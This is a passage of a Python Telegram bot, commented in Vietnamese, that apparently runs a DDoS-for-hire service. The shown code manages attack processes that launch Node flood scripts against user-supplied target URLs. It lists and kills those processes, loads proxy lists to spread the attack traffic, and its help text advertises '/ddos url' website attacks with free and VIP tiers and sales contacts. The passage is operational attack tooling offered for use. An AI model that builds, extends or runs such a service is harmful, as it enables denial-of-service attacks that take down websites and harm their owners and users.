                            process_type = "HTTP" if "HTTP1-2.js" in cmd else "FLOOD/BYPASS"
                            if i + 1 < len(cmdline):
                                target_url = cmdline[i + 1]
                            break
                    
                    node_processes.append({
                        'pid': proc.info['pid'],
                        'target': target_url,
                        'type': process_type,
                        'memory': memory_mb,
                        'running_time': running_time
                    })
                    
            except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess, Exception) as e:
                logger.error(f"Error processing process: {e}")
                continue

        if not node_processes:
            await update.message.reply_text('''<blockquote expandable>
║ • Không có tiến trình nào đang chạy</blockquote>''', parse_mode='HTML')
            return

        # Chia danh sách tiến trình thành các phần nhỏ hơn
        MAX_PROCESSES_PER_MESSAGE = 5
        chunks = [node_processes[i:i + MAX_PROCESSES_PER_MESSAGE] 
                 for i in range(0, len(node_processes), MAX_PROCESSES_PER_MESSAGE)]
        
        # Gửi từng phần như một tin nhắn riêng biệt
        for index, chunk in enumerate(chunks):
            process_list = []
            for i, proc in enumerate(chunk, 1 + index * MAX_PROCESSES_PER_MESSAGE):
                hours, remainder = divmod(proc['running_time'].seconds, 3600)
                minutes, seconds = divmod(remainder, 60)
                runtime = f"{hours}h {minutes}m {seconds}s"
                
                process_list.append(f'''<blockquote expandable>
║ 📌 Tiến trình {i}:
║ • PID: <code>{proc['pid']}</code>
║ • Target: <code>{proc['target']}</code>
║ • RAM: {proc['memory']} MB
║ • Thời gian chạy: {runtime}</blockquote>''')

            # Tạo tin nhắn cho phần hiện tại
            message = f'''<blockquote expandable>
╔═════════════════════════
║ 📊 DANH SÁCH TIẾN TRÌNH ({index + 1}/{len(chunks)})
║ • Tổng số: {len(node_processes)}{''.join(process_list)}
╚═══════════════════════════</blockquote>'''

            await update.message.reply_text(message, parse_mode='HTML')
            # Đợi một chút giữa các tin nhắn để tránh spam
            if index < len(chunks) - 1:
                await asyncio.sleep(0.5)

    except Exception as e:
        logger.error(f"Error in list_processes command: {e}")
        await update.message.reply_text(f'''<blockquote expandable>
❌ Lỗi khi lấy danh sách tiến trình
• {str(e)}</blockquote>''')

@restrict_room
async def kill_ddos(update: Update, context: CallbackContext):
    global bot_active
    user_id = update.message.from_user.id
    
    if user_id not in admins:
        return
        
    try:
        args = context.args
        specific_pid = None if not args else int(args[0])
        killed_processes = []
        
        # Danh sách các file cần kiểm tra
        target_files = ['two-methods.js']
        
        if specific_pid:
            # Kill specific process
            try:
                process = psutil.Process(specific_pid)
                cmdline = ' '.join(process.cmdline())
                if process.name() == 'node' and any(file in cmdline for file in target_files):
                    process.kill()
                    killed_processes.append(specific_pid)
                else:
                    await update.message.reply_text(f'''
❌ PID {specific_pid} KHÔNG HỢP LỆ
• PID không phải là tiến trình DDoS
• Sử dụng /ls để xem danh sách PID
''')
                    return
            except psutil.NoSuchProcess:
                await update.message.reply_text(f'''
❌ KHÔNG TÌM THẤY PID {specific_pid}
• PID không tồn tại
• Sử dụng /lsd để xem danh sách PID
''')
                return
            except Exception as e:
                logger.error(f"Error killing specific process: {e}")
                await update.message.reply_text(f"❌ Lỗi khi kill PID {specific_pid}: {str(e)}")
                return
        else:
            # Kill all processes
            bot_active = False
            
            # Kill through psutil
            for proc in psutil.process_iter(['pid', 'name', 'cmdline']):
                try:
                    if proc.info['name'] == 'node':
                        cmdline = proc.info.get('cmdline', [])
                        if cmdline and any(file in ' '.join(cmdline) for file in target_files):
                            process = psutil.Process(proc.info['pid'])
                            process.kill()
                            killed_processes.append(proc.info['pid'])
                except Exception as e:
                    logger.error(f"Error killing process: {e}")
                    continue
            
            # Additional shell kill command for cleanup
            try:
                if os.name == 'nt':  # Windows
                    os.system('taskkill /F /IM node.exe')
                else:  # Linux/Unix
                    kill_commands = [
                        "pkill -9 -f 'node.*two-methods.js'",
                        "pkill -9 -f 'node.*HTTP1-2.js'"
                    ]
                    for cmd in kill_commands:
                        os.system(cmd)
            except Exception as e:
                logger.error(f"Error killing via shell: {e}")

        # Prepare response message
        if killed_processes:
            if specific_pid:
                message = f'''
✅ KILL PID {specific_pid} THÀNH CÔNG
• Tiến trình đã dừng
• Sử dụng /lsd để xem danh sách còn lại'''
            else:
                message = f'''
✅ KILL ALL SUCCESS
• Đã dừng {len(killed_processes)} tiến trình
• PIDs: {', '.join(map(str, killed_processes))}
• Bot đã tắt
• Sử dụng /ond để bật lại'''
        else:
            message = '''
❌ KHÔNG CÓ TIẾN TRÌNH ĐANG CHẠY
• Bot đã tắt
• Sử dụng /ond để bật lại'''

        await update.message.reply_text(message)
            
    except ValueError:
        await update.message.reply_text('''
❌ PID KHÔNG HỢP LỆ
▶ Usage:
• /kill : Dừng tất cả tiến trình
• /kill <pid> : Dừng tiến trình cụ thể
• Sử dụng /lsd để xem danh sách PID''')
    except Exception as e:
        logger.error(f"Error in kill_ddos: {e}")

def kill_all_processes():
    """Kill all running Node.js processes on startup"""
    try:
        logger.info("Killing all existing Node.js processes...")
        killed_count = 0
        
        # Danh sách các file cần kiểm tra
        target_files = ['two-methods.js']
        
        # Kill qua psutil
        for proc in psutil.process_iter(['pid', 'name', 'cmdline']):
            try:
                if proc.info['name'] == 'node':
                    cmdline = proc.info.get('cmdline', [])
                    # Kiểm tra nếu cmdline chứa bất kỳ file nào trong target_files
                    if cmdline and any(file in ' '.join(cmdline) for file in target_files):
                        process = psutil.Process(proc.info['pid'])
                        
                        # Kill các tiến trình con trước
                        children = process.children(recursive=True)
                        for child in children:
                            child.kill()
                        psutil.wait_procs(children, timeout=3)
                        
                        # Kill tiến trình cha
                        process.kill()
                        killed_count += 1
                        
            except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess) as e:
                logger.error(f"Error killing process via psutil: {e}")
                continue
                
        # Kill qua shell command để đảm bảo
        try:
            if os.name == 'nt':  # Windows
                os.system('taskkill /F /IM node.exe')
            else:  # Linux/Unix
                # Kill cả hai loại process
                kill_commands = [
                    "pkill -9 -f 'node.*two-methods.js'",
                    "pkill -9 -f 'node.*HTTP1-2.js'"
                ]
                for cmd in kill_commands:
                    os.system(cmd)
        except Exception as e:
            logger.error(f"Error killing processes via shell: {e}")
            
        # Clear attack processes dictionary
        attack_processes.clear()
        
        logger.info(f"Successfully killed {killed_count} Node.js processes")
        
    except Exception as e:
        logger.error(f"Error in kill_all_processes: {e}")


async def add_proxy(update: Update, context: CallbackContext):
    user_id = update.message.from_user.id
    
    if user_id not in admins:
        return
    try:
        # Lấy nội dung tin nhắn
        message_text = update.message.text
        
        # Tách lệnh và danh sách proxy
        lines = message_text.split('\n')
        if len(lines) < 2:
            await update.message.reply_text('''
╔═════════════════════════
║ ❌ KHÔNG CÓ PROXY
║ • Vui lòng nhập proxy theo định dạng
║ • /addpx
║ • ip:port
║ • ip:port
╚═══════════════════════════''')
            return
            
        # Lọc bỏ dòng lệnh và lấy danh sách proxy
        proxies = lines[1:]
        
        # Kiểm tra định dạng proxy
        valid_proxies = []
        invalid_proxies = []
        
        for proxy in proxies:
            proxy = proxy.strip()
            if not proxy:  # Bỏ qua dòng trống
                continue
                
            # Kiểm tra định dạng ip:port
            try:
                ip, port = proxy.split(':')
                # Kiểm tra IP hợp lệ
                ipaddress.ip_address(ip)
                # Kiểm tra port hợp lệ
                port = int(port)
                if 1 <= port <= 65535:
                    valid_proxies.append(proxy)
                else:
                    invalid_proxies.append(proxy)
            except:
                invalid_proxies.append(proxy)
                
        if not valid_proxies:
            await update.message.reply_text('''
╔═════════════════════════
║ ❌ KHÔNG CÓ PROXY HỢP LỆ
║ • Tất cả proxy không đúng định dạng
║ • Vui lòng kiểm tra lại
╚═══════════════════════════''')
            return
            
        # Lưu proxy vào file
        proxy_path = './modules/proxy.txt'
        os.makedirs(os.path.dirname(proxy_path), exist_ok=True)
        
        # Ghi proxy mới vào file, ghi đè proxy cũ
        with open(proxy_path, 'w', encoding='utf-8') as f:
            f.write('\n'.join(valid_proxies))
            
        # Gửi thông báo kết quả
        message = f'''
╔═════════════════════════
║ ✅ CẬP NHẬT PROXY THÀNH CÔNG
║ • Tổng số proxy: {len(valid_proxies)}
║ • Proxy hợp lệ: {len(valid_proxies)}'''
        
        if invalid_proxies:
            message += f'''
║ • Proxy không hợp lệ: {len(invalid_proxies)}
║ • Danh sách proxy lỗi:
║ {chr(10).join(f"• {proxy}" for proxy in invalid_proxies[:5])}'''
            if len(invalid_proxies) > 5:
                message += f'''
║ • Và {len(invalid_proxies) - 5} proxy khác...'''
            
        message += '''
╚═══════════════════════════'''
        
        await update.message.reply_text(message)
        
    except Exception as e:
        logger.error(f"Error in add_proxy: {e}")
        await update.message.reply_text(f'''
╔═════════════════════════
║ ❌ LỖI CẬP NHẬT PROXY
║ • {str(e)}
╚═══════════════════════════''')
        
async def update_proxy_new(update: Update, context: CallbackContext):
    user_id = update.message.from_user.id
    
    if user_id not in admins:
        return
    try:
        # Lấy nội dung tin nhắn
        message_text = update.message.text
        
        # Tách lệnh và danh sách proxy
        lines = message_text.split('\n')
        if len(lines) < 2:
            await update.message.reply_text('''
╔═════════════════════════
║ ❌ KHÔNG CÓ PROXY
║ • Vui lòng nhập proxy theo định dạng
║ • /uppx
║ • ip:port
║ • ip:port
╚═══════════════════════════''')
            return
            
        # Lọc bỏ dòng lệnh và lấy danh sách proxy
        proxies = lines[1:]
        
        # Kiểm tra định dạng proxy
        valid_proxies = []
        invalid_proxies = []
        
        for proxy in proxies:
            proxy = proxy.strip()
            if not proxy:  # Bỏ qua dòng trống
                continue
                
            # Kiểm tra định dạng ip:port
            try:
                ip, port = proxy.split(':')
                # Kiểm tra IP hợp lệ
                ipaddress.ip_address(ip)
                # Kiểm tra port hợp lệ
                port = int(port)
                if 1 <= port <= 65535:
                    valid_proxies.append(proxy)
                else:
                    invalid_proxies.append(proxy)
            except:
                invalid_proxies.append(proxy)
                
        if not valid_proxies:
            await update.message.reply_text('''
╔═════════════════════════
║ ❌ KHÔNG CÓ PROXY HỢP LỆ
║ • Tất cả proxy không đúng định dạng
║ • Vui lòng kiểm tra lại
╚═══════════════════════════''')
            return
            
        # Đọc proxy cũ từ file
        proxy_path = './modules/proxy.txt'
        os.makedirs(os.path.dirname(proxy_path), exist_ok=True)
        
        existing_proxies = []
        if os.path.exists(proxy_path):
            with open(proxy_path, 'r', encoding='utf-8') as f:
                existing_proxies = [line.strip() for line in f if line.strip()]
        
        # Loại bỏ proxy trùng lặp từ danh sách mới
        new_valid_proxies = [p for p in valid_proxies if p not in existing_proxies]
        
        # Kết hợp proxy mới và cũ
        all_proxies = new_valid_proxies + existing_proxies
        
        # Lưu tất cả proxy vào file
        with open(proxy_path, 'w', encoding='utf-8') as f:
            f.write('\n'.join(all_proxies))
            
        # Gửi thông báo kết quả
        message = f'''
╔═════════════════════════
║ ✅ CẬP NHẬT PROXY THÀNH CÔNG
║ • Proxy cũ: {len(existing_proxies)}
║ • Proxy mới thêm: {len(new_valid_proxies)}
║ • Tổng số proxy: {len(all_proxies)}'''
        
        if invalid_proxies:
            message += f'''
║ • Proxy không hợp lệ: {len(invalid_proxies)}
║ • Danh sách proxy lỗi:
║ {chr(10).join(f"• {proxy}" for proxy in invalid_proxies[:5])}'''
            if len(invalid_proxies) > 5:
                message += f'''
║ • Và {len(invalid_proxies) - 5} proxy khác...'''
            
        message += '''
╚═══════════════════════════'''
        
        await update.message.reply_text(message)
        
    except Exception as e:
        logger.error(f"Error in update_proxy: {e}")
        await update.message.reply_text(f'''
╔═════════════════════════
║ ❌ LỖI CẬP NHẬT PROXY
║ • {str(e)}
╚═══════════════════════════''')

@restrict_room
async def start(update: Update, context: CallbackContext):
    message = '''<blockquote expandable>
<b>Hướng dẫn /ddos</b>
👉 <b>Ấn xem cách DDOS...</b> 👈

║ 📌 VIP /muavipduocgi:
║ • /ddos url - Tấn công website
║ • /ddos method url - Chọn methods
║ • /methods - Các phương thức tấn công
║ 💡 Phương thức mặc định - FLOOD
║
║ 📌 FREE /laykey:
║ • /ddos url - Tấn công website
║ • Mặc định method là FLOOD
║
║ ADMIN:
║ • /taskd - ...
║ • /kill - ...
║ • /lsd - ...
║ • /proxy - ...
║ • /addpx - ...
║ • /uppx - ...
║ • /offd - ...
║ • /ond - ...
║ 💡 Muốn ddos mạnh hơn ib. @tranthanhpho
║ 💡 Thuê vps ib. @NeganSSHConsole
╚═══════════════════════════</blockquote>'''

    await update.message.reply_text(message, parse_mode='HTML')

def main():
    kill_all_processes()
    application = Application.builder().token(TOKEN).build()
    
    # Add handlers
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("ddos", ddos))
    application.add_handler(CommandHandler("kill", kill_ddos))
    application.add_handler(CommandHandler("proxy", proxy))
    application.add_handler(CommandHandler("addpx", add_proxy))
    application.add_handler(CommandHandler("uppx", update_proxy_new))
    application.add_handler(CallbackQueryHandler(handle_status_check, pattern="^st_"))
    application.add_handler(CommandHandler("offd", bot_off))
    application.add_handler(CommandHandler("ond", bot_on))
    application.add_handler(CommandHandler("taskd", task))
    application.add_handler(CommandHandler("lsd", list_processes))
    application.add_handler(CommandHandler("methods", methods))

    # Khởi động cron job bằng job queue
    job_queue = application.job_queue
    job_queue.run_repeating(
        callback=check_and_update_proxy,
        interval=1800,  # Chạy mỗi 1800 giây tránh gây log nhiều
        first=1  # Chạy lần đầu sau 1 giây
    )
    # Add error handler
    application.add_error_handler(error_handler)
    
    # Create new event loop and run cleanup
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    loop.run_until_complete(cleanup_attacks())
    
    # Gửi thông báo khởi động nếu được (ko lỗi)
    application.job_queue.run_once(
        lambda context: asyncio.create_task(send_restart_notification(application)),
        when=0
    )
    # Start bot
    application.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == '__main__':
    try:
        observer = Observer()
        handler = ReloadOnChangeHandler(lambda: os.execl(sys.executable, sys.executable, *sys.argv))
        observer.schedule(handler, path='.', recursive=False)
        observer.start()
        
        main()
    except KeyboardInterrupt:
        observer.stop()
    observer.join()
